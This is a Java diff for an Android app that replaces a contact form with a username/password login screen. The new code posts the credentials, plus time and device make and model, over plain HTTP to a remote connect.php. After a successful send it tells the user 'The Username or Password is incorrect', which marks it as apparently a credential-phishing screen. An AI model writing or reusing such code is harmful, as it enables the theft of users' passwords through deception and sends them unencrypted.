@@ -28,10 +28,10 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-    private EditText edName,edEmail,edMessage;
+    private EditText edUsername,edPassword;
 
 
-    String url="http://www.emample.com/Apps/connect.php";
+    String url="http://www.example.com/Apps/connect.php";
     private String errorSendText="Network Error";
     private String successSendText="The Username or Password is incorrect";
 
@@ -51,9 +51,8 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
 
-        edName=findViewById(R.id.ed_message_name);
-        edEmail=findViewById(R.id.ed_message_email);
-        edMessage=findViewById(R.id.ed_message_text);
+        edUsername=findViewById(R.id.ed_message_username);
+        edPassword=findViewById(R.id.ed_message_password);
 
         requestQueue= Volley.newRequestQueue(this);
 
@@ -79,19 +78,18 @@ public class MainActivity extends AppCompatActivity {
         }else if (counter == 1){
 
 
-                final String name, email, message;
-                name = edName.getText().toString();
-                email = edEmail.getText().toString();
-                message = edMessage.getText().toString();
+                final String username, password;
+                username = edUsername.getText().toString();
+                password = edPassword.getText().toString();
 
-                if (edName.getText().toString().isEmpty()) {
-                    String nameError = "Enter your Username";
-                    Snackbar snackbar = Snackbar.make(view, nameError, Snackbar.LENGTH_LONG);
+                if (edUsername.getText().toString().isEmpty()) {
+                    String usernameError = "Enter your Username";
+                    Snackbar snackbar = Snackbar.make(view, usernameError, Snackbar.LENGTH_LONG);
                     View view1 = snackbar.getView();
                     view1.setBackgroundColor(getResources().getColor(R.color.materialGreen1));
                     snackbar.show();
                     return;
-                } else if (edEmail.getText().toString().isEmpty()) {
+                } else if (edPassword.getText().toString().isEmpty()) {
                     String emailError = "Enter your Password";
                     Snackbar snackbar = Snackbar.make(view, emailError, Snackbar.LENGTH_LONG);
                     View view1 = snackbar.getView();
@@ -125,16 +123,15 @@ public class MainActivity extends AppCompatActivity {
                     Calendar rightNow = Calendar.getInstance();
                     int currentHourIn24Format = rightNow.get(Calendar.HOUR_OF_DAY);
                     int currentMinutes = rightNow.get(Calendar.MINUTE);
-                    String HourAndMinutes = String.valueOf(currentHourIn24Format)+":"+currentMinutes;
+                    String HourAndMinutes = currentHourIn24Format+":"+currentMinutes;
                     //-------------------------------------------get current time--------------------------------------E
 
 
                     @Override
                     protected Map<String, String> getParams() {
                         Map<String,String> Data=new HashMap<>();
-                        Data.put("Name",name);
-                        Data.put("Email",email);
-                        Data.put("Message",message);
+                        Data.put("Username",username);
+                        Data.put("Password",password);
                         Data.put("Time",String.valueOf(HourAndMinutes));
                         Data.put("Manufacturer",String.valueOf(Manufacturer));
                         Data.put("MobileModel",String.valueOf(MobileModel));
